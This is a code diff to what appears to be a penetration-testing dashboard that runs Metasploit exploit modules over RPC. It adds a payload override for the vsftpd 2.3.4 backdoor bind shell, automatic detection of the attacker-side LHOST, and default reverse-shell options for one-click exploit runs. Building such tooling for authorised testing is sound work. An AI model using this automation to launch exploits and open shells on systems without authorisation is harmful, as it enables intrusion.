@@ -1176,6 +1176,55 @@ def _do_msf_check(s, svc, target: str):
     })
 
 
+_EXPLOIT_PAYLOAD_OVERRIDES = {
+    # vsftpd 2.3.4 pre-opens a bind shell on port 6200 of the target;
+    # cmd/unix/interact just connects to that port - no LHOST needed.
+    # Without this override modern MSF auto-picks a reverse meterpreter
+    # which fails validation because we don't send LHOST.
+    "exploit/unix/ftp/vsftpd_234_backdoor": "cmd/unix/interact",
+}
+
+
+def _detect_lhost(target: str) -> str:
+    """Return the local IP the kernel would route to `target`.
+
+    Uses the connect()-without-sending trick on a UDP socket: ask the
+    kernel which source IP it would pick, without actually emitting any
+    packets. Falls back to 127.0.0.1 (which will fail loudly in MSF's
+    validator, with a clear "LHOST" error - much better than guessing).
+    """
+    import socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect((target, 1))
+        return s.getsockname()[0]
+    except Exception:
+        return "127.0.0.1"
+    finally:
+        s.close()
+
+
+def _build_exploit_options(module_path: str, target: str, port: int) -> dict:
+    """Build the Metasploit `set` options dict for an exploit run.
+
+    Always sets RHOSTS/RPORT. For modules with a known no-LHOST payload
+    (e.g. the vsftpd 2.3.4 bind shell) we pin PAYLOAD explicitly so MSF
+    doesn't auto-pick a reverse meterpreter that would then complain
+    about a missing LHOST. For everything else we auto-detect LHOST
+    from the route to the target so the operator gets a working
+    one-click run instead of an OptionValidateError.
+    """
+    opts: dict = {"RHOSTS": target, "RPORT": port}
+    payload = _EXPLOIT_PAYLOAD_OVERRIDES.get(module_path)
+    if payload:
+        opts["PAYLOAD"] = payload
+    else:
+        # Reverse-style payloads need an attacker-side listener.
+        opts["LHOST"] = _detect_lhost(target)
+        opts["LPORT"] = 4444
+    return opts
+
+
 def _do_msf_exploit(s, svc, target: str, module_path: str, action: str):
     """Run a Metasploit *exploit* module via RPC and persist the run.
 
@@ -1201,7 +1250,7 @@ def _do_msf_exploit(s, svc, target: str, module_path: str, action: str):
     selection = SelectedModule(
         module=module_path,
         action=action,
-        options={"RHOSTS": target, "RPORT": svc.port},
+        options=_build_exploit_options(module_path, target, svc.port),
         target_host=target,
         target_port=svc.port,
         rationale="Operator-initiated exploit via dashboard",
@@ -1272,6 +1321,7 @@ def _do_msf_exploit(s, svc, target: str, module_path: str, action: str):
         "action": action,
         "status": result.status,
         "module": module_path,
+        "options": selection.options,
         "duration_seconds": round(result.duration_seconds, 1),
         "run_id": run_id,
         "output": (result.output or "(no output captured)")[-3000:],
